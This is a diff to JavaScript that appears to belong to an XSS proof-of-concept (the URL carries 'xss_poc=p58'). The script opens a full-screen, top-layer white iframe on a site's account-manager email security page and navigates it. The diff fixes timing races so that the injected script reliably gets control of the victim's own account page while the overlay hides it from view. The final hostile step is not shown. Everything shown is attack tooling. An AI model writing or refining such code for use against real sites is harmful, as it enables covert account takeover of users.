@@ -241,7 +241,11 @@
 
   function createAccountFrame(timeoutMs) {
     return new Promise(function (resolve, reject) {
+      var settled = false;
       var timer = setTimeout(function () {
+        if (settled) return;
+        settled = true;
+        frame.removeEventListener("load", onLoad);
         reject(new Error("FRAME_LOAD_TIMEOUT"));
       }, timeoutMs);
       var old = document.getElementById(FRAME_ID);
@@ -251,33 +255,67 @@
       frame.style.cssText =
         "position:fixed;inset:0;width:100vw;height:100vh;border:0;" +
         "z-index:2147483646;background:#fff";
-      frame.addEventListener(
-        "load",
-        function () {
-          clearTimeout(timer);
-          resolve(frame);
-        },
-        { once: true },
-      );
-      frame.src = "/app/account-manager/security/email?xss_poc=p58";
+
+      function onLoad() {
+        if (settled) return;
+        var href = "";
+        try {
+          href = String(frame.contentWindow.location.href || "");
+        } catch (_) {
+          return;
+        }
+        // Appending an iframe fires an initial about:blank load in Chrome.
+        // Resolve only after Account Manager itself has loaded.
+        if (
+          href === "about:blank" ||
+          href.indexOf("/app/account-manager/security/email") === -1
+        ) {
+          return;
+        }
+        settled = true;
+        clearTimeout(timer);
+        frame.removeEventListener("load", onLoad);
+        resolve(frame);
+      }
+
+      frame.addEventListener("load", onLoad);
       (document.body || document.documentElement).appendChild(frame);
+
+      // Defer the real navigation until after the initial about:blank document
+      // has been attached, so its load event cannot win the race.
+      setTimeout(function () {
+        if (!settled) {
+          frame.src =
+            "/app/account-manager/security/email?xss_poc=p58&cb=" + Date.now();
+        }
+      }, 0);
     });
   }
 
   function navigateAccountFrame(frame, url, timeoutMs) {
     return new Promise(function (resolve, reject) {
+      var expected = new URL(url, location.href);
+      var settled = false;
       var timer = setTimeout(function () {
+        if (settled) return;
+        settled = true;
+        frame.removeEventListener("load", onLoad);
         reject(new Error("FRAME_RELOAD_TIMEOUT"));
       }, timeoutMs);
-      frame.addEventListener(
-        "load",
-        function () {
-          clearTimeout(timer);
-          resolve();
-        },
-        { once: true },
-      );
-      frame.contentWindow.location.href = url;
+
+      function onLoad() {
+        if (settled) return;
+        var realm = frameRealm(frame);
+        if (!realm || realm.win.location.href === "about:blank") return;
+        if (realm.win.location.pathname !== expected.pathname) return;
+        settled = true;
+        clearTimeout(timer);
+        frame.removeEventListener("load", onLoad);
+        resolve();
+      }
+
+      frame.addEventListener("load", onLoad);
+      frame.contentWindow.location.href = expected.href;
     });
   }
 
